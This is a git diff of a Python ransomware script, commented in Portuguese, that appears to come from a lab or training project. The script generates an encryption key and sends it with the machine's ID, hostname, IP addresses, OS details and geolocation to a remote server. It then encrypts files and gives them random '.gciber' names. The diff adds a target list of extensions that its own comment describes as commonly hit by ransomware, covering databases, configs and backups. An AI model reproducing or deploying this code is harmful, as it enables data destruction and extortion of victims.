@@ -40,7 +40,7 @@ def show_popup():
     else:  # Supondo que qualquer outro SO seja Linux
         show_popup_linux(test_file)
 
-SERVER_URL = "http://10.0.2.15:5000"
+SERVER_URL = "http://192.168.74.123:5000"
 
 def generate_key():
     return Fernet.generate_key()
@@ -56,7 +56,8 @@ def encrypt_file(file_name, key):
 def generate_random_name():
     return ''.join(random.choices(string.ascii_letters + string.digits, k=6)) + ".gciber"
 
-def find_and_encrypt_files(key):
+
+def find_and_encrypt_files(extensions, key):
     original_names = {} # Dicionário para armazenar os nomes originais.
     
     # Diretório de teste
@@ -64,17 +65,18 @@ def find_and_encrypt_files(key):
     #current_directory = os.getcwd()  # Obtém o diretório atual
     for root, dirs, files in os.walk(current_directory):  # Percorre apenas o diretório atual
         for file_name in files:
-            file_path = os.path.join(root, file_name)
-            # Criptografa o arquivo
-            encrypt_file(file_path, key)
-            # Gera um novo nome para o arquivo
-            new_name = generate_random_name()
-            new_file_path = os.path.join(root, new_name)
-            # Renomeia o arquivo criptografado
-            os.rename(file_path, new_file_path)
-            # Armazena o nome original e o novo nome no dicionário.
-            original_names[new_name] = file_name
-            print(f"{file_name} foi encriptado e renomeado para {new_name}")
+            if any(file_name.endswith(ext) for ext in extensions):
+                file_path = os.path.join(root, file_name)
+                # Criptografa o arquivo
+                encrypt_file(file_path, key)
+                # Gera um novo nome para o arquivo
+                new_name = generate_random_name()
+                new_file_path = os.path.join(root, new_name)
+                # Renomeia o arquivo criptografado
+                os.rename(file_path, new_file_path)
+                # Armazena o nome original e o novo nome no dicionário.
+                original_names[new_name] = file_name
+                print(f"{file_name} foi encriptado e renomeado para {new_name}")
     # Salva os nomes originais em um arquivo JSON
     with open(os.path.join(current_directory, "file_names.json"), "w") as json_file:
         json.dump(original_names, json_file)
@@ -91,6 +93,7 @@ def get_ip_address():
     finally:
         s.close()
     return ip_address
+
 
 def generate_machine_id():
     hostname = socket.gethostname()
@@ -126,8 +129,9 @@ def get_public_ip():
 
     return public_ip
 
+
 def send_key_to_server(machine_id, key, machine_name, ip_address, os_info, public_ip):
-    location = get_geolocation()  # Obtém a localização da máquina
+    location = get_geolocation() # Obtém a localização da máquina
     data = {
         "machine_id": machine_id,
         "encryption_key": key.decode(),
@@ -143,35 +147,30 @@ def send_key_to_server(machine_id, key, machine_name, ip_address, os_info, publi
     else:
         print("Falha ao enviar a chave")
 
-# Função adicional para descobrir todas as extensões presentes no diretório
-def find_extensions_in_directory(directory):
-    extensions = set()
-    for root, dirs, files in os.walk(directory):
-        for file_name in files:
-            ext = os.path.splitext(file_name)[1]
-            if ext:
-                extensions.add(ext)
-    return sorted(extensions)
-
 def main():
-    machine_id = generate_machine_id()  # Gera o machine_id
+    machine_id = generate_machine_id() # Gera o machine_id
     key = generate_key()
-    machine_name = socket.gethostname()  # Obtém o nome da máquina
-    ip_address = get_ip_address()  # Obtém o ip da máquina
-    os_info = platform.platform()  # Obtém o nome do sistema operacional
+    machine_name = socket.gethostname() # Obtém o usuário da máquina
+    ip_address = get_ip_address() # Obtém o ip da máquina
+    os_info = platform.platform() # Obtém o nome do sistema operacional
     public_ip = get_public_ip()
     send_key_to_server(machine_id, key, machine_name, ip_address, public_ip, os_info)
+    
 
-    # Encontra todas as extensões presentes na pasta "teste"
-    directory = "teste"  # Diretório de exemplo
-    found_extensions = find_extensions_in_directory(directory)
-    print(f"Extensões encontradas: {found_extensions}")
+    # Extensões de arquivos comumente visados por ransomwares, incluindo arquivos de servidores
+    extensions = [
+        ".txt", ".pdf", ".docx", ".xlsx", ".jpg", ".png", ".zip", ".rar", ".pptx",  # Arquivos comuns
+        ".sql", ".db", ".dbf", ".mdb", ".accdb",  # Bancos de dados
+        ".conf", ".ini", ".cnf", ".cfg",  # Arquivos de configuração
+        ".xml", ".json", ".yaml", ".yml",  # Arquivos de dados
+        ".log", ".bak", ".tar", ".gz", ".7z"  # Arquivos de log e backups
+    ]
 
-    # Criptografa todos os arquivos presentes no diretório
-    find_and_encrypt_files(key)
-    print(f"Todos os arquivos no diretório atual foram encriptados.")
+    # Busca e encripta todos os arquivos com as extensões especificadas no diretório atual
+    find_and_encrypt_files(extensions, key)
+    print(f"Todos os arquivos no diretório atual com as extensões especificadas foram encriptados.")
+
 
     show_popup()
-
 if __name__ == "__main__":
     main()
